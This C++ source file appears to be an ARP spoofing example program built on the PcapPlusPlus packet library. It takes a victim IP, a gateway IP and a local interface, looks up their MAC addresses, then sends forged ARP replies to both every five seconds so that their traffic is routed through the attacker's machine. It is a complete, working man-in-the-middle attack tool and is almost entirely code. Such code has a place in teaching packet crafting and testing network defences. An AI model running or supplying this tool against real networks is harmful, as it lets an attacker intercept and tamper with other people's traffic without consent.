#include <iostream>
#include <fstream>
#include "MacAddress.h"
#include "IpAddress.h"
#include "PcapPlusPlusVersion.h"
#include "SystemUtils.h"
#include "PcapLiveDeviceList.h"
#include "PcapLiveDevice.h"
#include "Packet.h"
#include "EthLayer.h"
#include "ArpLayer.h"
#include <getopt.h>

#define EXIT_WITH_ERROR(reason)                                                                                        \
	do                                                                                                                 \
	{                                                                                                                  \
		printUsage();                                                                                                  \
		std::cout << std::endl << "ERROR: " << reason << std::endl << std::endl;                                       \
		exit(1);                                                                                                       \
	} while (0)

static struct option L3FwdOptions[] = {
	{ "interface", required_argument, nullptr, 'i' },
	{ "victim",    required_argument, nullptr, 'c' },
	{ "gateway",   required_argument, nullptr, 'g' },
	{ "version",   no_argument,       nullptr, 'v' },
	{ "help",      no_argument,       nullptr, 'h' },
	{ nullptr,     0,                 nullptr, 0   }
};

/**
 * Print application usage
 */
void printUsage()
{
	std::cout << std::endl
	          << "Usage:" << std::endl
	          << "------" << std::endl
	          << pcpp::AppName::get() << " [-hv] -i interface_ip -c victim_ip -g gateway_ip" << std::endl
	          << std::endl
	          << "Options:" << std::endl
	          << std::endl
	          << "    -i interface_ip   : The IPv4 address of interface to use" << std::endl
	          << "    -c victim_ip      : The IPv4 address of the victim" << std::endl
	          << "    -g gateway_ip     : The IPv4 address of the gateway" << std::endl
	          << "    -h                : Displays this help message and exits" << std::endl
	          << "    -v                : Displays the current version and exists" << std::endl
	          << std::endl;
}

/**
 * Print application version
 */
void printAppVersion()
{
	std::cout << pcpp::AppName::get() << " " << pcpp::getPcapPlusPlusVersionFull() << std::endl
	          << "Built: " << pcpp::getBuildDateTime() << std::endl
	          << "Built from: " << pcpp::getGitInfo() << std::endl;
	exit(0);
}

pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDevice* pDevice)
{
	// Create an ARP packet and change its fields
	pcpp::Packet arpRequest(500);

	pcpp::MacAddress macSrc = pDevice->getMacAddress();
	pcpp::MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
	pcpp::EthLayer ethLayer(macSrc, macDst, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
	pcpp::ArpLayer arpLayer(pcpp::ArpRequest(pDevice->getMacAddress(), pDevice->getIPv4Address(), ipAddr));

	arpRequest.addLayer(&ethLayer);
	arpRequest.addLayer(&arpLayer);
	arpRequest.computeCalculateFields();

	// setup arp reply filter
	pcpp::ArpFilter arpFilter(pcpp::ARP_REPLY);
	if (!pDevice->setFilter(arpFilter))
	{
		std::cerr << "Could not set ARP filter on device" << std::endl;
		return pcpp::MacAddress::Zero;
	}

	// send the arp request and wait for arp reply
	pDevice->sendPacket(&arpRequest);
	pcpp::RawPacketVector capturedPackets;
	pDevice->startCapture(capturedPackets);
	std::this_thread::sleep_for(std::chrono::seconds(2));
	pDevice->stopCapture();

	if (capturedPackets.size() < 1)
	{
		std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << std::endl;
		return pcpp::MacAddress::Zero;
	}

	// parse arp reply and extract the MAC address
	pcpp::Packet arpReply(capturedPackets.front());
	if (arpReply.isPacketOfType(pcpp::ARP))
	{
		return arpReply.getLayerOfType<pcpp::ArpLayer>()->getSenderMacAddress();
	}
	std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << std::endl;
	return pcpp::MacAddress::Zero;
}

void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatewayAddr,
                   const pcpp::IPv4Address& victimAddr)
{
	pcpp::MacAddress gatewayMacAddr;

	// Get the gateway MAC address
	try
	{
		gatewayMacAddr = getMacAddress(gatewayAddr, pDevice);
	}
	catch (std::exception& e)
	{
		EXIT_WITH_ERROR("Failed to find gateway MAC address: " << e.what());
	}
	std::cout << "Got gateway MAC address: " << gatewayMacAddr << std::endl;

	// Get the victim MAC address
	pcpp::MacAddress victimMacAddr;
	try
	{
		victimMacAddr = getMacAddress(victimAddr, pDevice);
	}
	catch (std::exception& e)
	{
		EXIT_WITH_ERROR("Failed to find victim MAC address: " << e.what());
	}
	std::cout << "Got victim MAC address: " << victimMacAddr << std::endl;

	pcpp::MacAddress deviceMacAddress = pDevice->getMacAddress();

	// Create ARP reply for the gateway
	pcpp::Packet gwArpReply(500);
	pcpp::EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
	pcpp::ArpLayer gwArpLayer(pcpp::ArpReply(pDevice->getMacAddress(), victimAddr, gatewayMacAddr, gatewayAddr));
	gwArpReply.addLayer(&gwEthLayer);
	gwArpReply.addLayer(&gwArpLayer);
	gwArpReply.computeCalculateFields();

	// Create ARP reply for the victim
	pcpp::Packet victimArpReply(500);
	pcpp::EthLayer victimEthLayer(deviceMacAddress, victimMacAddr, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
	pcpp::ArpLayer victimArpLayer(pcpp::ArpReply(pDevice->getMacAddress(), gatewayAddr, victimMacAddr, victimAddr));
	victimArpReply.addLayer(&victimEthLayer);
	victimArpReply.addLayer(&victimArpLayer);
	victimArpReply.computeCalculateFields();

	// Send ARP replies to gateway and to victim every 5 seconds
	std::cout << "Sending ARP replies to victim and to gateway every 5 seconds..." << std::endl << std::endl;
	while (1)
	{
		pDevice->sendPacket(&gwArpReply);
		std::cout << "Sent ARP reply: " << gatewayAddr << " [gateway] is at MAC address " << deviceMacAddress << " [me]"
		          << std::endl;
		pDevice->sendPacket(&victimArpReply);
		std::cout << "Sent ARP reply: " << victimAddr << " [victim] is at MAC address " << deviceMacAddress << " [me]"
		          << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

int main(int argc, char* argv[])
{
	pcpp::AppName::init(argc, argv);

	// Get arguments from user for incoming interface and outgoing interface

	std::string iface = "", victim = "", gateway = "";
	int optionIndex = 0;
	int opt = 0;
	while ((opt = getopt_long(argc, argv, "i:c:g:hv", L3FwdOptions, &optionIndex)) != -1)
	{
		switch (opt)
		{
		case 0:
			break;
		case 'i':
			iface = optarg;
			break;
		case 'c':
			victim = optarg;
			break;
		case 'g':
			gateway = optarg;
			break;
		case 'h':
			printUsage();
			exit(0);
			break;
		case 'v':
			printAppVersion();
			break;
		default:
			printUsage();
			exit(-1);
		}
	}

	// Both incoming and outgoing interfaces must be provided by user
	if (iface == "" || victim == "" || gateway == "")
	{
		EXIT_WITH_ERROR("Please specify both interface IP, victim IP and gateway IP");
	}

	// Currently supports only IPv4 addresses
	pcpp::IPv4Address ifaceAddr;
	pcpp::IPv4Address victimAddr;
	pcpp::IPv4Address gatewayAddr;

	try
	{
		ifaceAddr = pcpp::IPv4Address(iface);
	}
	catch (const std::exception&)
	{
		EXIT_WITH_ERROR("Interface address is not valid");
	}
	try
	{
		victimAddr = pcpp::IPv4Address(victim);
	}
	catch (const std::exception&)
	{
		EXIT_WITH_ERROR("Victim address is not valid");
	}
	try
	{
		gatewayAddr = pcpp::IPv4Address(gateway);
	}
	catch (const std::exception&)
	{
		EXIT_WITH_ERROR("Gateway address is not valid");
	}

	pcpp::PcapLiveDevice* pIfaceDevice = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(ifaceAddr);

	// Verifying interface is valid
	if (pIfaceDevice == nullptr)
	{
		EXIT_WITH_ERROR("Cannot find interface");
	}

	// Opening interface device
	if (!pIfaceDevice->open())
	{
		EXIT_WITH_ERROR("Cannot open interface");
	}

	doArpSpoofing(pIfaceDevice, gatewayAddr, victimAddr);
}
